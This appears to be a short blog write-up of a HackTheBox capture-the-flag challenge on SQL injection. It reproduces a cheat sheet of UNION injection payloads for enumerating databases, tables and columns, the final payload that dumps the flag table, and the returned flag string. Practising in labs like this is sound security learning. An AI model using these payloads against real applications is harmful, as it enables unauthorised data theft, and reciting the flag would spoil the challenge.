---
title: Unholy Union
date: 2024-10-27 00:14:09 
categories: [Cybersecurity, Web Application Security, Penetration Testing, CTF]
tags:
  [sqli, sql injection, union injection]
---

A challenge about SLQi that uses Union injection technique. 

![unholy-main](https://joonkim0625.github.io/images/Unholy.png)

What is convenient about this challenge is it shows the query that is used to pull the data from the database. I used these SQL injection cheat sheet that is from the SQLi fundamental module from the HTB academy:

```
cn' UNION select 1,database(),2,3-- - 	Current database name
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 	List all databases
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 	List all tables in a specific database
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - 	List all columns in a specific table
```

Steps I took based on the cheat sheet from the HTB Academy:
- Find the current database I am in (or you could list all databases)
	- `flag`
	- I had to add extra columns to make the injection work
- List all tables in this specific database
	- Again, `flag`
- List all columns in this table
	- Again, only `flag`

So, once I gathered this information, I used the following query to get the flag:

`cn' UNION select flag, null, null, null, null from flag-- -`

Then I got this response:

```sql
[
  {
    "id": "HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?}",
    "name": null,
    "description": null,
    "origin": null,
    "created_at": null
  }
]
```

This was a good easy practice challenge that I worked on from the HTB academy module!
